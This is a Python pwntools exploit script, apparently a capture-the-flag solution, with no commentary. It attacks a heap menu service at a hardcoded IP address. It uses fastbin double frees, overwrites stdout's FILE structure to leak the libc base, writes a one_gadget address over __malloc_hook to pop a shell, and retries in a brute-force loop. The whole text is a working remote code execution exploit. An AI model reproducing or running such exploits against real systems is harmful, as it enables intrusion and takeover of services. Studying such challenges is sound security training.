from pwn import *

def c(size,cont='1\n'):
    p.sendlineafter(":","1")
    p.sendlineafter(":","name")
    p.sendlineafter(":",str(size))
    p.sendafter(":",cont)

def d(idx):
    p.sendlineafter(":","2")
    p.sendlineafter(":",str(idx))
while True:
    try:
        p=remote("49.232.101.41", "9999")
        c(0x68)
        c(0x68)
        c(0x10)
        d(0)
        d(1)
        d(0)
        c(0x68,p64(0x60203d))
        c(0x68)
        c(0x68)
        c(0x68,'123'+p64(0)+p64(0x51)+p64(0)*7+p64(0x602090)+p64(0x602060)+p64(0x21))
        d(7)
        c(0xf0) # 0
        c(0x10) # 1
        d(0)
        c(0x68,'\xdd\x25') # 2
        c(0x68) # 3
        c(0x68) # 4
        d(3)
        d(4)
        d(3)
        c(0x48,'\x00'*0x38+p64(0x602090)+p64(0x602060))
        c(0x68,'\xb0\x32')
        c(0x68)
        c(0x68)
        c(0x68)
        c(0x68,'111'+p64(0)*6+p64(0xfbad3c80)+p64(0)*3+p8(0))
        # print hexdump(p.recv())
        p.recvuntil("\x7f\x00\x00")
        libc_base=u64(p.recv(6)+"\x00\x00")-0x3c56a3
        print hex(libc_base)
        d(7)
        c(0x48,'\x00'*0x38+p64(0x602090)+p64(0x602060))
        c(0x68)
        c(0x68)
        d(0)
        d(1)
        d(0)
        c(0x68,p64(libc_base+0x3c4aed))
        c(0x68)
        c(0x68)
        c(0x68,'123'+p64(0)+p64(libc_base+0x4526a)+p64(0x846C6+libc_base))
        p.sendlineafter(":","1")
        p.interactive()
    except:
        p.close()